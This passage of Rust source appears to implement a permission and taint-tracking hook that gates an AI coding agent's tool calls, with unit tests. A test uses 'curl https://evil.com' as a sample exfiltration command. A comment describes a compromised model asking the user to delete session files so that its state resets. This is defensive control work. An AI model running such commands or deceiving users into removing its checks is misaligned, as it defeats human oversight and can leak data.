                         - Or update allowed_compartments in the tool's manifest",
                        if manifest.allowed_compartments.is_empty() {
                            "all".to_string()
                        } else {
                            manifest.allowed_compartments.join(", ")
                        }
                    ));
                    nucleus_deny!(
                        "{}  denied — not allowed in compartment '{comp_name}'",
                        input.tool_name
                    );
                    println!("{}", serde_json::to_string(&out).unwrap());
                    exit_codes::ExitCode::Deny.exit();
                }
            }
        }
    }

    // SECURITY (#485): Check if tool has been flagged for manifest violations.
    // Trust revocation is checked early — before kernel.decide() — because a
    // tool that lied about its manifest should not be re-evaluated against the
    // capability lattice (it already proved it cannot be trusted).
    if let SessionLoad::Loaded(ref session) | SessionLoad::Fresh(ref session) =
        load_session(&input.session_id)
    {
        if let Some(&count) = session.flagged_tools.get(&input.tool_name) {
            if count >= MANIFEST_VIOLATION_REVOKE_THRESHOLD {
                let out = HookOutput::deny(format!(
                    "Blocked: tool '{}' has been revoked for this session — \
                     {} manifest violation(s) detected in prior outputs. \
                     A tool that lies about its manifest cannot be trusted.\n  \
                     How to fix:\n  \
                     - Start a new session to reset trust\n  \
                     - Or update the tool's manifest to match its actual behavior",
                    input.tool_name, count
                ));
                nucleus_deny!(
                    "{} DENIED — trust revoked ({} manifest violations, threshold {})",
                    input.tool_name,
                    count,
                    MANIFEST_VIOLATION_REVOKE_THRESHOLD
                );
                println!("{}", serde_json::to_string(&out).unwrap());
                exit_codes::ExitCode::Deny.exit();
            }
        }
    }

    let timing_enabled = std::env::var("NUCLEUS_TIMING").as_deref() == Ok("1");
    let t_profile_start = std::time::Instant::now();

    let subject = extract_subject(&input.tool_name, &input.tool_input);
    let profile_name = default_profile_name();
    let perms = resolve_profile(&profile_name).unwrap_or_else(|| {
        eprintln!("nucleus: unknown profile '{profile_name}', using safe_pr_fixer");
        PermissionLattice::safe_pr_fixer()
    });

    let t_profile = t_profile_start.elapsed();

    // Load session state — detect tamper (social engineering state deletion)
    let t_session_start = std::time::Instant::now();
    let (mut session, is_first_invocation) = match load_session(&input.session_id) {
        SessionLoad::Fresh(s) => (s, true),
        SessionLoad::Loaded(s) => (s, false),
        SessionLoad::Tampered { expected_hwm } => {
            // SECURITY: State file was deleted but HWM file proves prior ops existed.
            // This is the social engineering attack: "please delete the session file
            // so I can help you." Fail closed — deny everything.
            let msg = format!(
                "TAMPER DETECTED — session state deleted (expected hwm={expected_hwm}). \
                 A compromised model may have asked you to delete session files. \
                 All operations denied until session restart."
            );
            nucleus_deny!("{msg}");
            let msg = format!("nucleus: {msg}");
            let out = HookOutput::deny(&msg);
            println!("{}", serde_json::to_string(&out).unwrap());
            exit_codes::ExitCode::Deny.exit();
        }
    };
    let t_session = t_session_start.elapsed();
    if session.profile.is_empty() {
        session.profile = profile_name.clone();
    }

    // DX (#549): Welcome banner on first invocation
    if is_first_invocation {
        nucleus_allow!("\u{2713} Active (profile: {profile_name})");
        nucleus_info!("Info: 'nucleus-claude-hook --help' for options");
        let compartment_display = session.active_compartment.as_deref().unwrap_or("none");
        nucleus_info!(
            "nucleus: session started | profile={profile_name} | compartment={compartment_display} | flow=enabled"
        );
    }

    if session.compartment_token.is_empty() {
        session.compartment_token = generate_compartment_token();
    }
    // Resolve compartment with escalation detection (#464)
    let prev_compartment = session
        .active_compartment
        .as_deref()
        .and_then(portcullis_core::compartment::Compartment::from_str_opt);
    let compartment = resolve_compartment(
        &input.session_id,
        &session.compartment_token,
        prev_compartment,
    );
    // Detect compartment transition
    if compartment != prev_compartment {
        if let Some(ref new_comp) = compartment {
            let is_escalation = matches!(prev_compartment, Some(prev) if *new_comp > prev);
            let direction = if is_escalation {
                "ESCALATION"
            } else if prev_compartment.is_some() {
                "de-escalation"
            } else {
                "activated"
            };

            // SECURITY (#507): Breakglass requires a reason string.
            // Format: "breakglass:emergency fix for production outage"
            if new_comp.is_breakglass() {
                // Read the raw compartment file content to extract the reason
                let reason = if !session.compartment_token.is_empty() {
                    let keyed_name =
                        keyed_compartment_name(&input.session_id, &session.compartment_token);
                    let compartment_file = session_dir().join(format!("{keyed_name}.compartment"));
                    std::fs::read_to_string(&compartment_file)
                        .ok()
                        .and_then(|content| {
                            let now = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs();
                            portcullis_core::compartment::BreakglassEntry::parse(
                                content.trim(),
                                now,
                            )
                        })
                } else {
                    None
                };

                match reason {
                    Some(entry) => {
                        nucleus_warn!(
                            "BREAKGLASS entered — reason: '{}' (enhanced audit active)",
                            entry.reason
                        );
                    }
                    None => {
                        let msg = "Blocked: breakglass requires a reason. \
                                   Write 'breakglass:your reason here' to the compartment file.";
                        eprintln!("nucleus: {msg}");
                        let out = HookOutput::deny(msg);
                        println!("{}", serde_json::to_string(&out).unwrap());
                        session.high_water_mark += 1;
                        save_session(&input.session_id, &session);
                        exit_codes::ExitCode::Deny.exit();
                    }
                }
            }

            // SECURITY (#457): Upward transitions (escalation) require human approval.
            if is_escalation {
                let msg = format!(
                    "compartment escalation {} -> {} requires human approval",
                    prev_compartment.map(|c| c.to_string()).unwrap_or_default(),
                    new_comp,
                );
                nucleus_warn!("{msg}");
                let msg = format!("nucleus: {msg}");
                let out = HookOutput::ask(&msg);
                println!("{}", serde_json::to_string(&out).unwrap());
                // FIX #483: Do NOT save the escalated compartment before approval.
                // If user denies, the next invocation should still see the old
                // compartment. Only increment HWM (to prevent tampering).
                session.high_water_mark += 1;
                save_session(&input.session_id, &session);
                return;
            }

            let from_str = prev_compartment
                .map(|c| c.to_string())
                .unwrap_or_else(|| "none".to_string());
            eprintln!(
                "nucleus: compartment transition: {from_str} -> {} ({direction})",
                new_comp,
            );

            // Record transition in receipt chain (#460)
            persist_transition_receipt(
                &input.session_id,
                prev_compartment.map(|c| {
                    // Need a string that lives long enough
                    match c {
                        portcullis_core::compartment::Compartment::Research => "research",
                        portcullis_core::compartment::Compartment::Draft => "draft",
                        portcullis_core::compartment::Compartment::Execute => "execute",
                        portcullis_core::compartment::Compartment::Breakglass => "breakglass",
                    }
                }),
                &new_comp.to_string(),
                direction,
            );

            // COMPARTMENT FLOW RESET: On transition, clear flow observations
            // so the new compartment starts with a clean flow graph.
            //
            // This is the key insight: research mode can read web content,
            // but when you switch to draft mode, the web taint doesn't carry
            // over — draft blocks web entirely, so the new compartment's
            // flow graph has no adversarial nodes. You can write freely.
            //
            // The exposure accumulator (allowed_ops) is NOT cleared — it
            // tracks what happened across the entire session for audit.
            // Only the flow graph observations are reset.
            if prev_compartment.is_some() {
                eprintln!(
                    "nucleus: flow graph reset for compartment transition ({} observations cleared)",
                    session.flow_observations.len()
                );
                session.flow_observations.clear();
            }
        }
        session.active_compartment = compartment.map(|c| c.to_string());
    }

    let effective_perms = if let Some(ref comp) = compartment {
        let core_ceiling = comp.ceiling();
        let ceiling = portcullis::CapabilityLattice {
            read_files: core_ceiling.read_files,
            write_files: core_ceiling.write_files,
            edit_files: core_ceiling.edit_files,
            run_bash: core_ceiling.run_bash,
            glob_search: core_ceiling.glob_search,
            grep_search: core_ceiling.grep_search,
            web_search: core_ceiling.web_search,
            web_fetch: core_ceiling.web_fetch,
            git_commit: core_ceiling.git_commit,
            git_push: core_ceiling.git_push,
            create_pr: core_ceiling.create_pr,
            manage_pods: core_ceiling.manage_pods,
            spawn_agent: core_ceiling.spawn_agent,
            ..Default::default()
        };
        let mut narrowed = perms.clone();
        narrowed.capabilities = narrowed.capabilities.meet(&ceiling);
        narrowed
    } else {
        perms
    };

    // Apply organizational autonomy ceiling (#482).
    // NUCLEUS_AUTONOMY_CEILING controls the org-wide cap:
    //   "production" — no git push/PR, writes at LowRisk
    //   "sandbox"    — read-only, no execution
    //   (unset)      — unrestricted (no organizational cap)
    let effective_perms = match std::env::var("NUCLEUS_AUTONOMY_CEILING").ok().as_deref() {
        Some("production") | Some("sandbox") => {
            let core_ceiling =
                if std::env::var("NUCLEUS_AUTONOMY_CEILING").as_deref() == Ok("sandbox") {
                    let c = portcullis_core::autonomy::AutonomyCeiling::sandbox();
                    nucleus_info!("autonomy ceiling: sandbox (read-only)");
                    c.capabilities
                } else {
                    let c = portcullis_core::autonomy::AutonomyCeiling::production();
                    nucleus_info!("autonomy ceiling: production (no push/PR)");
                    c.capabilities
                };
            // Convert portcullis_core::CapabilityLattice to portcullis::CapabilityLattice
            let ceiling = portcullis::CapabilityLattice {
                read_files: core_ceiling.read_files,
                write_files: core_ceiling.write_files,
                edit_files: core_ceiling.edit_files,
                run_bash: core_ceiling.run_bash,
                glob_search: core_ceiling.glob_search,
                grep_search: core_ceiling.grep_search,
                web_search: core_ceiling.web_search,
                web_fetch: core_ceiling.web_fetch,
                git_commit: core_ceiling.git_commit,
                git_push: core_ceiling.git_push,
                create_pr: core_ceiling.create_pr,
                manage_pods: core_ceiling.manage_pods,
                spawn_agent: core_ceiling.spawn_agent,
                ..Default::default()
            };
            let mut capped = effective_perms;
            capped.capabilities = capped.capabilities.meet(&ceiling);
            capped
        }
        _ => effective_perms,
    };

    let t_kernel_start = std::time::Instant::now();
    let mut kernel = Kernel::new(effective_perms);
    kernel.enable_flow_graph();

    // Load egress policy from .nucleus/egress.toml (if present).
    // SECURITY: Fail-closed — malformed policy denies all egress.
    let egress_dir = std::env::current_dir().unwrap_or_default().join(".nucleus");
    match portcullis::EgressPolicy::load_from_dir(&egress_dir) {
        Ok(Some(policy)) => {
            if is_first_invocation {
                nucleus_info!(
                    "egress policy loaded ({} allowed, {} denied hosts)",
                    policy.allowed_hosts.len(),
                    policy.denied_hosts.len()
                );
            }
            kernel.set_egress_policy(policy);
        }
        Ok(None) => {} // No egress.toml — all hosts allowed
        Err(e) => {
            nucleus_warn!("WARNING — failed to load egress policy: {e}");
            nucleus_warn!("fail-closed — all egress denied until egress.toml is fixed");
            if let Ok(p) = portcullis::EgressPolicy::from_toml("") {
                kernel.set_egress_policy(p);
            }
        }
    }

    // Load admissibility policy from .nucleus/policy.toml (if present).
    // SECURITY: Fail-closed — malformed policy denies all operations.
    let policy_dir = std::env::current_dir().unwrap_or_default();
    match portcullis::PolicyRuleSet::load_from_dir(&policy_dir) {
        Ok(Some(rules)) => {
            if is_first_invocation {
                nucleus_info!("admissibility policy loaded ({} rules)", rules.len());
            }
            kernel.set_policy_rules(rules);
        }
        Ok(None) => {} // No policy.toml — no admissibility filtering
        Err(e) => {
            nucleus_warn!("WARNING — failed to load admissibility policy: {e}");
            nucleus_warn!("fail-closed — all operations denied until policy.toml is fixed");
            // Empty rule set = default deny everything
            kernel.set_policy_rules(portcullis::PolicyRuleSet::new());
        }
    }

    // PHASE 4: Import parent agent's flow label and chain reference.
    // When a parent agent spawns this session, it sets:
    //   NUCLEUS_PARENT_LABEL  — encoded IFC label (taint propagation)
    //   NUCLEUS_PARENT_SESSION — parent's session ID (receipt chain link)
    //   NUCLEUS_PARENT_CHAIN_HASH — parent's chain head hash at spawn time
    if session.allowed_ops.is_empty() {
        // Only on first invocation — don't re-import on replay
        if let Ok(parent_label_str) = std::env::var("NUCLEUS_PARENT_LABEL") {
            if let Some(parent_label) = portcullis_core::wire::decode_label(&parent_label_str) {
                let kind = if parent_label.integrity == portcullis_core::IntegLevel::Adversarial {
                    NodeKind::WebContent
                } else {
                    NodeKind::ToolResponse
                };
                if let Ok(id) = kernel.observe(kind, &[]) {
                    eprintln!(
                        "nucleus: inherited parent label: integ={:?} auth={:?} (flow_node: {id})",
                        parent_label.integrity, parent_label.authority,
                    );
                    session.flow_observations.push((
                        node_kind_to_u8(kind),
                        "parent_agent".to_string(),
                        portcullis_core::wire::encode_label(&parent_label),
                    ));
                }
            }
        }
        // Record parent chain reference for cross-agent receipt linking
        if let Ok(parent_sid) = std::env::var("NUCLEUS_PARENT_SESSION") {
            session.parent_session_id = Some(parent_sid.clone());
            if let Ok(parent_hash) = std::env::var("NUCLEUS_PARENT_CHAIN_HASH") {
                session.parent_chain_hash = Some(parent_hash.clone());
                eprintln!(
                    "nucleus: linked to parent chain: session={parent_sid} hash={}...",
                    &parent_hash[..16.min(parent_hash.len())]
                );
            }
        }

        // Inherit parent compartment (#461).
        // The child's compartment is capped at the parent's level:
        // child ≤ parent (can only narrow, never escalate).
        if let Ok(parent_sid) = std::env::var("NUCLEUS_PARENT_SESSION") {
            let safe_parent = sanitize_session_id(&parent_sid);
            let comp_path = session_dir().join(format!("{safe_parent}.parent-compartment"));
            if let Ok(parent_comp_str) = std::fs::read_to_string(&comp_path) {
                if let Some(parent_comp) =
                    portcullis_core::compartment::Compartment::from_str_opt(parent_comp_str.trim())
                {
                    // If child has no compartment, inherit parent's.
                    // If child has a compartment, cap it at parent's level.
                    match &compartment {
                        None => {
                            eprintln!("nucleus: inherited parent compartment: {parent_comp}");
                            // Write compartment file so resolve_compartment picks it up
                            if !session.compartment_token.is_empty() {
                                let keyed = keyed_compartment_name(
                                    &input.session_id,
                                    &session.compartment_token,
                                );
                                let file = session_dir().join(format!("{keyed}.compartment"));
                                std::fs::write(&file, parent_comp.to_string()).ok();
                            }
                            session.active_compartment = Some(parent_comp.to_string());
                        }
                        Some(child_comp) if *child_comp > parent_comp => {
                            eprintln!(
                                "nucleus: child compartment {} exceeds parent {} — capping to parent",
                                child_comp, parent_comp
                            );
                            if !session.compartment_token.is_empty() {
                                let keyed = keyed_compartment_name(
                                    &input.session_id,
                                    &session.compartment_token,
                                );
                                let file = session_dir().join(format!("{keyed}.compartment"));
                                std::fs::write(&file, parent_comp.to_string()).ok();
                            }
                            session.active_compartment = Some(parent_comp.to_string());
                        }
                        _ => {
                            // Child is at or below parent level — OK
                        }
                    }
                }
            }
        }
    }

    // Replay previous operations to rebuild exposure state AND flow graph.
    // Each allowed op is: 1) replayed in the flat kernel for exposure,
    // 2) observed in the flow graph as a DAG node with category-based parents.
    //
    // PHASE 1 UPGRADE: Instead of a linear chain (where every node depends
    // on the previous one, causing total session taint after any web fetch),
    // we use a LeafTracker that maintains leaf nodes by source category.
    // This means file reads and web fetches are independent branches —
    // a write only inherits adversarial taint if web content actually exists
    // in the session. If you never fetch a URL, writes remain untainted.
    let t_kernel_build = t_kernel_start.elapsed();
    let t_replay_start = std::time::Instant::now();
    let mut leaves = LeafTracker::default();
    for (op_str, subj) in &session.allowed_ops {
        if let Ok(op) = Operation::try_from(op_str.as_str()) {
            kernel.decide(op, subj);
        }
    }
    for &(kind_u8, ref _op_str, ref _subj) in &session.flow_observations {
        let kind = u8_to_node_kind(kind_u8);
        let parents = leaves.parents_for(kind);
        if let Ok(id) = kernel.observe(kind, &parents) {
            leaves.record(kind, id);
        }
    }

    // Make the actual decision using the causal DAG.
    // The current operation's parents come from the leaf tracker —
    // actions depend on all source categories, sources are independent.
    let t_replay = t_replay_start.elapsed();
    let t_decide_start = std::time::Instant::now();
    let obs_kind = operation_to_node_kind(operation);
    let parents = leaves.parents_for(obs_kind);
    let (decision, _token) = kernel.decide_with_parents(operation, &subject, &parents);
    let exposure_count = decision.exposure_transition.post_count;
    let t_decide = t_decide_start.elapsed();

    // Get or create the session's signing key.
    // Ephemeral per session — generated once, persisted in session state.
    // If key generation fails (low entropy, sandboxed env), proceed without
    // signing rather than panicking the security gate (#481).
    let signing_key: Option<Ed25519KeyPair> = if session.signing_key_pkcs8.is_empty() {
        let rng = SystemRandom::new();
        match Ed25519KeyPair::generate_pkcs8(&rng) {
            Ok(pkcs8) => {
                session.signing_key_pkcs8 = pkcs8.as_ref().to_vec();
                Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).ok()
            }
            Err(e) => {
                nucleus_warn!(
                    "WARNING — Ed25519 key generation failed: {e}. Receipts will be unsigned."
                );
                None
            }
        }
    } else {
        match Ed25519KeyPair::from_pkcs8(&session.signing_key_pkcs8) {
            Ok(key) => Some(key),
            Err(e) => {
                nucleus_warn!(
                    "WARNING — stored signing key corrupted: {e}. Receipts will be unsigned."
                );
                session.signing_key_pkcs8.clear(); // Don't reuse corrupted key
                None
            }
        }
    };

    // Build a receipt from the flow graph's action node (if available).
    // The receipt captures the causal chain and verdict.
    let t_receipt_start = std::time::Instant::now();
    let flow_receipt = decision.flow_node_id.and_then(|node_id| {
        kernel.flow_graph().and_then(|graph| {
            let action_node = graph.get(node_id)?;
            let ancestor_refs: Vec<&_> = parents.iter().filter_map(|&pid| graph.get(pid)).collect();
            let flow_verdict = if decision.verdict.is_denied() {
                portcullis_core::flow::FlowVerdict::Deny(
                    portcullis_core::flow::FlowDenyReason::AuthorityEscalation,
                )
            } else {
                portcullis_core::flow::FlowVerdict::Allow
            };
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            let mut receipt = build_receipt(action_node, &ancestor_refs, flow_verdict, now);
            receipt.set_prev_hash(session.chain_head_hash);
            // Bind receipt to this session (#492)
            let chain_id = {
                use sha2::{Digest, Sha256};
                let mut h = Sha256::new();
                h.update(b"nucleus-chain:");
                h.update(input.session_id.as_bytes());
                let hash = h.finalize();
                let mut id = [0u8; 32];
                id.copy_from_slice(&hash);
                id
            };
            receipt.set_chain_id(chain_id);
            if let Some(ref key) = signing_key {
                sign_receipt(&mut receipt, key);
            }
            Some(receipt)
        })
    });

    let t_receipt = t_receipt_start.elapsed();

    // Update chain head hash and persist receipt if produced.
    if let Some(ref receipt) = flow_receipt {
        session.chain_head_hash = receipt_hash(receipt);
        persist_receipt(
            &input.session_id,
            receipt,
            operation,
            &subject,
            &session.parent_session_id,
            &session.parent_chain_hash,
            compartment.as_ref().map(|c| c.to_string()).as_deref(),
        );
    }

    let output = match decision.verdict {
        Verdict::Allow => {
            // Persist: operation will execute — track in both exposure and flow graph
            session
                .allowed_ops
                .push((operation.to_string(), subject.clone()));
            let obs_kind = operation_to_node_kind(operation);
            session.flow_observations.push((
                node_kind_to_u8(obs_kind),
                operation.to_string(),
                subject.clone(),
            ));
            // Record the observation index so PostToolUse can insert the
            // ToolResponse as a sibling of this pre-tool observation (#593).
            session.last_pre_tool_obs_index = Some(session.flow_observations.len() - 1);

            // DX (#567): When web content taints the session, print recovery path
            if matches!(operation, Operation::WebFetch | Operation::WebSearch) {
                nucleus_warn!("\u{26a0} Session tainted by web content — writes will be blocked.");
                if compartment.is_some() {
                    eprintln!(
                        "nucleus: Tip: switch to 'draft' compartment to write (flow graph resets on transition)"
                    );
                } else {
                    eprintln!(
                        "nucleus: Tip: set NUCLEUS_COMPARTMENT=draft or restart to clear taint"
                    );
                }
            }

            // PHASE 4: When SpawnAgent is allowed, export the current flow
            // label AND chain reference so the child inherits taint and
            // its receipt chain links back to the parent's.
            if operation == Operation::SpawnAgent {
                let safe_id = sanitize_session_id(&input.session_id);
                if let Some(graph) = kernel.flow_graph() {
                    if let Some(node_id) = decision.flow_node_id {
                        if let Some(node) = graph.get(node_id) {
                            let label_str = portcullis_core::wire::encode_label(&node.label);
                            let label_path = session_dir().join(format!("{safe_id}.parent-label"));
                            std::fs::write(&label_path, &label_str).ok();
                            eprintln!(
                                "nucleus: exported parent label for child agent: {label_str}"
                            );
                        }
                    }
                }
                // Export chain reference so child can link back
                let chain_hash_hex = hex::encode(session.chain_head_hash);
                let chain_path = session_dir().join(format!("{safe_id}.parent-chain"));
                let chain_ref = format!("session={}\nhash={}\n", &input.session_id, chain_hash_hex);
                std::fs::write(&chain_path, &chain_ref).ok();

                // Export parent compartment so child inherits ceiling (#461).
                // Child compartment ≤ parent compartment (can only narrow).
                if let Some(ref comp) = compartment {
                    let comp_path = session_dir().join(format!("{safe_id}.parent-compartment"));
                    std::fs::write(&comp_path, comp.to_string()).ok();
                    eprintln!(
                        "nucleus: exported parent compartment '{}' for child agent",
                        comp
                    );
                }
            }

            session.high_water_mark += 1;

            // Inject additionalContext when state changes (#842)
            let context = maybe_build_context(
                &session,
                compartment.as_ref(),
                operation,
                is_first_invocation,
            );
            if context.is_some() {
                // Update fingerprint so we don't repeat on next call
                session.last_injected_context_key = Some(current_fingerprint(
                    compartment.as_ref(),
                    &session,
                    operation,
                ));
            }

            save_session(&input.session_id, &session);
            HookOutput::allow_with_context(context)
        }
        Verdict::RequiresApproval => {
            session.high_water_mark += 1;
            save_session(&input.session_id, &session);
            HookOutput::ask(format!(
                "nucleus: exposure {exposure_count}/3 — requires human approval"
            ))
        }
        Verdict::Deny(ref reason) => {
            // Do NOT persist op: operation was blocked.
            // Still increment HWM — denied ops prove the session existed.
            session.high_water_mark += 1;
            save_session(&input.session_id, &session);
            HookOutput::deny(format_denial_for_user(
                reason,
                operation,
                compartment.as_ref().map(|c| c.to_string()).as_deref(),
            ))
        }
    };

    // NUCLEUS_TIMING=1: emit phase breakdown to stderr (#522)
    if timing_enabled {
        let total_ms = start_time.elapsed().as_secs_f64() * 1000.0;
        eprintln!(
            "nucleus-timing: total={:.2}ms profile={:.3}ms session={:.3}ms kernel={:.3}ms replay={:.3}ms decide={:.3}ms receipt={:.3}ms obs={}",
            total_ms,
            t_profile.as_secs_f64() * 1000.0,
            t_session.as_secs_f64() * 1000.0,
            t_kernel_build.as_secs_f64() * 1000.0,
            t_replay.as_secs_f64() * 1000.0,
            t_decide.as_secs_f64() * 1000.0,
            t_receipt.as_secs_f64() * 1000.0,
            session.flow_observations.len(),
        );
    }

    // Log to stderr
    let verdict_str = output.permission_decision();
    let flow_node = decision
        .flow_node_id
        .map(|id| format!(", flow_node: {id}"))
        .unwrap_or_default();
    let _receipt_status = if flow_receipt
        .as_ref()
        .map(|r| r.is_signed())
        .unwrap_or(false)
    {
        ", receipt: signed"
    } else {
        ""
    };
    // DX (#545): Show latency + clean verdict
    let elapsed_ms = start_time.elapsed().as_millis();
    let timing = if elapsed_ms > 100 {
        format!(" \x1b[33m({elapsed_ms}ms)\x1b[0m") // yellow if slow
    } else {
        format!(" ({elapsed_ms}ms)")
    };
    if verdict_str == "allow" {
        let short_subject = if subject.len() > 40 {
            format!("{}...", &subject[..37])
        } else {
            subject.clone()
        };
        nucleus_allow!("\u{2713} {operation} {short_subject}{timing}");
    } else {
        nucleus_deny!("\u{2717} {operation} {subject} -> {verdict_str} [exposure: {exposure_count}/3{flow_node}]{timing}");
    }

    // Write output to stdout
    let json = match serde_json::to_string(&output) {
        Ok(j) => j,
        Err(e) => {
            // Defense-in-depth: if serialization fails, output a deny to fail-closed (#481)
            nucleus_deny!("CRITICAL — failed to serialize output: {e}. Denying.");
            r#"{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"internal error: serialization failed"}}"#.to_string()
        }
    };
    println!("{json}");
    io::stdout().flush().ok();

    // Exit non-zero on deny to block the tool call via exit code.
    // Claude Code blocks on exit 2 regardless of JSON output.
    let code = exit_codes::ExitCode::from_verdict(&decision.verdict);
    if code != exit_codes::ExitCode::Allow {
        code.exit();
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_resolve_all_profiles() {
        for name in PROFILES {
            assert!(
                resolve_profile(name).is_some(),
                "profile {name} should resolve"
            );
        }
    }

    #[test]
    fn test_resolve_unknown_profile() {
        assert!(resolve_profile("nonexistent").is_none());
    }

    #[test]
    fn test_kernel_allow_read() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(matches!(d.verdict, Verdict::Allow));
    }

    #[test]
    fn test_kernel_deny_git_push() {
        let perms = PermissionLattice::read_only();
        let mut kernel = Kernel::new(perms);
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(matches!(d.verdict, Verdict::Deny(_)));
    }

    #[test]
    fn test_hook_output_format() {
        let out = HookOutput::allow_with_context(None);
        let json = serde_json::to_string(&out).unwrap();
        assert!(json.contains("\"permissionDecision\":\"allow\""));
        assert!(json.contains("\"hookSpecificOutput\""));
        assert!(json.contains("\"hookEventName\":\"PreToolUse\""));
        assert!(!json.contains("permissionDecisionReason")); // skip_serializing_if

        let deny = HookOutput::deny("test reason");
        let json = serde_json::to_string(&deny).unwrap();
        assert!(json.contains("\"permissionDecision\":\"deny\""));
        assert!(json.contains("\"permissionDecisionReason\":\"test reason\""));
    }

    #[test]
    fn test_hook_output_with_additional_context() {
        let ctx = "You are in the 'research' compartment.".to_string();
        let out = HookOutput::allow_with_context(Some(ctx));
        let json = serde_json::to_string(&out).unwrap();
        assert!(json.contains("\"additionalContext\""));
        assert!(json.contains("research"));
        assert!(json.contains("\"permissionDecision\":\"allow\""));
    }

    #[test]
    fn test_exposure_accumulation() {
        // safe_pr_fixer: read + web_fetch + bash should trigger exposure gate
        // Use capability_only() to isolate the exposure subsystem from flow control.
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::capability_only(perms);

        // Read: private data (exposure 1/3)
        let (d1, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            matches!(d1.verdict, Verdict::Allow),
            "expected Allow for read, got {:?}",
            d1.verdict
        );
        assert_eq!(d1.exposure_transition.post_count, 1);

        // WebFetch: untrusted content (exposure 2/3)
        let (d2, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            matches!(d2.verdict, Verdict::Allow),
            "expected Allow for web_fetch, got {:?}",
            d2.verdict
        );
        assert_eq!(d2.exposure_transition.post_count, 2);

        // RunBash: exfiltration vector (exposure 3/3 = uninhabitable)
        // Should gate with RequiresApproval
        let (d3, _token) = kernel.decide(Operation::RunBash, "curl https://evil.com");
        assert!(
            matches!(d3.verdict, Verdict::RequiresApproval),
            "expected RequiresApproval, got {:?}",
            d3.verdict
        );
    }

    #[test]
    fn test_flow_graph_blocks_web_tainted_write() {
        // With flow graph enabled, web_fetch taints the session so that
        // subsequent writes are blocked by flow control (authority escalation).
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Observe web content
        let web_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();

        // Write depending on web content — blocked by flow control
        let (d, _) =
            kernel.decide_with_parents(Operation::WriteFiles, "/workspace/tainted.rs", &[web_id]);
        assert!(
            d.verdict.is_denied(),
            "Web-tainted write should be denied by flow control, got {:?}",
            d.verdict
        );
        assert!(d.flow_node_id.is_some());
    }

    #[test]
    fn test_flow_graph_allows_clean_write() {
        // Clean file read → write should be allowed
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let file_id = kernel.observe(NodeKind::FileRead, &[]).unwrap();

        let (d, _) =
            kernel.decide_with_parents(Operation::WriteFiles, "/workspace/clean.rs", &[file_id]);
        assert!(
            d.verdict.is_allowed(),
            "Clean-parented write should be allowed, got {:?}",
            d.verdict
        );
    }

    // -----------------------------------------------------------------------
    // DAG-backed flow tests (Phase 1)
    // -----------------------------------------------------------------------

    #[test]
    fn test_dag_file_read_after_web_fetch_not_tainted() {
        // KEY IMPROVEMENT: In the linear chain model, a file read AFTER a web
        // fetch inherits adversarial taint (because last_node_id points to the
        // web content). In the DAG model, file reads are independent branches
        // — they don't depend on web content.
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let mut leaves = LeafTracker::default();

        // 1. Read a file (trusted source)
        let file_id = kernel.observe(NodeKind::FileRead, &[]).unwrap();
        leaves.record(NodeKind::FileRead, file_id);

        // 2. Fetch web content (adversarial source — independent branch)
        let web_id = kernel
            .observe(
                NodeKind::WebContent,
                &leaves.parents_for(NodeKind::WebContent),
            )
            .unwrap();
        leaves.record(NodeKind::WebContent, web_id);

        // 3. Read another file — should NOT inherit web taint
        let file2_parents = leaves.parents_for(NodeKind::FileRead);
        // Parents should be [file_id], NOT [web_id]
        assert!(
            !file2_parents.contains(&web_id),
            "File read parents should not include web content node"
        );
        assert!(
            file2_parents.contains(&file_id),
            "File read parents should include prior file read"
        );

        let file2_id = kernel.observe(NodeKind::FileRead, &file2_parents).unwrap();
        leaves.record(NodeKind::FileRead, file2_id);

        // 4. Write depending only on file reads — should be ALLOWED
        //    (because the write's parents only include the trusted branch)
        let write_parents = leaves.parents_for(NodeKind::OutboundAction);
        let (d, _) = kernel.decide_with_parents(
            Operation::WriteFiles,
            "/workspace/clean.rs",
            &write_parents,
        );
        // This WILL be denied because OutboundAction parents include ALL
        // source categories (including adversarial). This is the conservative
        // choice — an action may have been influenced by any session data.
        // The improvement over linear chain: SOURCE nodes don't cross-contaminate.
        // Actions still inherit from all sources (conservative).
        assert!(
            d.verdict.is_denied(),
            "Write should still be denied when web content exists in session"
        );
    }

    #[test]
    fn test_dag_write_allowed_without_web_content() {
        // Without any web content in the session, writes should be allowed.
        // This was also true in the linear chain, but confirms the DAG
        // model doesn't break this fundamental property.
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let mut leaves = LeafTracker::default();

        // Read files only — no web content
        let f1 = kernel.observe(NodeKind::FileRead, &[]).unwrap();
        leaves.record(NodeKind::FileRead, f1);
        let f2 = kernel
            .observe(NodeKind::FileRead, &leaves.parents_for(NodeKind::FileRead))
            .unwrap();
        leaves.record(NodeKind::FileRead, f2);

        // Write — parents are only trusted leaves, no adversarial
        let write_parents = leaves.parents_for(NodeKind::OutboundAction);
        assert!(
            leaves.adversarial.is_empty(),
            "No adversarial content should exist"
        );

        let (d, _) = kernel.decide_with_parents(
            Operation::WriteFiles,
            "/workspace/clean.rs",
            &write_parents,
        );
        assert!(
            d.verdict.is_allowed(),
            "Write with only trusted parents should be allowed, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_leaf_tracker_categories() {
        let mut leaves = LeafTracker::default();

